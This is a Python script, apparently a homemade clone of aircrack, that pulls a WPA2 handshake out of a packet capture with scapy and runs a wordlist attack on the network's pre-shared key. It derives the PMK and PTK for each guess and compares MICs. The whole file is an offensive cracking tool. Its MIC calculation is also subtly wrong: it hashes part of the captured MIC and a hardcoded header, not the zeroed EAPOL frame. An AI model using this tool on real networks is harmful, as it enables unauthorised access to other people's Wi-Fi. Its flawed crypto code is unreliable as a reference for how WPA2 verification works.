import sys
import hmac
import hashlib
from scapy.all import rdpcap, EAPOL, Dot11Beacon
import binascii
import argparse

# WPA2 Key Expansion Function (PRF) for PTK derivation
def custom_prf512(pmk, a, b):
    """ WPA2 Key Expansion function to derive PTK from PMK """
    blen = 64  # PTK is 512 bits (64 bytes)
    r = b""
    i = 0
    while len(r) < blen:
        r += hmac.new(pmk, a + bytes([i]) + b, hashlib.sha1).digest()
        i += 1
    return r[:blen]

# Function to derive PTK from PMK
def derive_ptk(pmk, anonce, snonce, sta_mac, bssid):
    """ Derives the Pairwise Transient Key (PTK) from PMK and other parameters """
    key_data = min(sta_mac, bssid) + max(sta_mac, bssid) + min(anonce, snonce) + max(anonce, snonce)
    ptk = custom_prf512(pmk, b"Pairwise key expansion", key_data)
    return ptk

# Extract MIC, Nonces, and other data from the pcap file
def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            if mic and snonce and sta_mac and bssid and anonce:
                break

        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")

    return mic, snonce, sta_mac, bssid, anonce, ssid

# Crack the WPA2-PSK using the extracted MIC and Nonces
def crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist):
    ssid = ssid.encode()
    sta_mac = binascii.unhexlify(sta_mac.replace(':', ''))
    bssid = binascii.unhexlify(bssid.replace(':', ''))
    mic = binascii.unhexlify(mic.hex())

    # Read the wordlist
    for word in wordlist:
        word = word.strip()
        print(f"Trying PSK: {word}")

        psk = word.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
        print(f"PMK: {pmk.hex()}")

        # Correctly derive PTK
        ptk = derive_ptk(pmk, anonce, snonce, sta_mac, bssid)
        print(f"PTK: {ptk.hex()}")

        # MIC Calculation
        mic_calc = hmac.new(ptk[:16], b'\x01\x03\x00\x75\x00\x00\x00\x00' + mic[18:], hashlib.sha1).digest()[:16]
        print(f"Calculated MIC: {mic_calc.hex()}")

        if mic_calc == mic:
            print(f"Correct PSK found: {word}")
            return word

    print("No valid PSK found in wordlist.")
    return None

# Command-line argument parsing
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Crack WPA PSK using aircrack.py')
    parser.add_argument('capture_file', help='Capture file (CAP/PCAP)')
    parser.add_argument('-P', '--wordlist', required=True, help='Wordlist file')

    args = parser.parse_args()
    capture_file = args.capture_file
    wordlist_file = args.wordlist

    # Extract required information from the capture file
    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(capture_file)

    if mic and snonce and sta_mac and bssid and anonce and ssid:
        # Read wordlist file
        with open(wordlist_file, 'r') as f:
            wordlist = f.readlines()

        # Attempt to crack WPA2 PSK
        crack_psk(mic, snonce, sta_mac, bssid, anonce, ssid, wordlist)
    else:
        print("Failed to extract necessary values from capture file.")
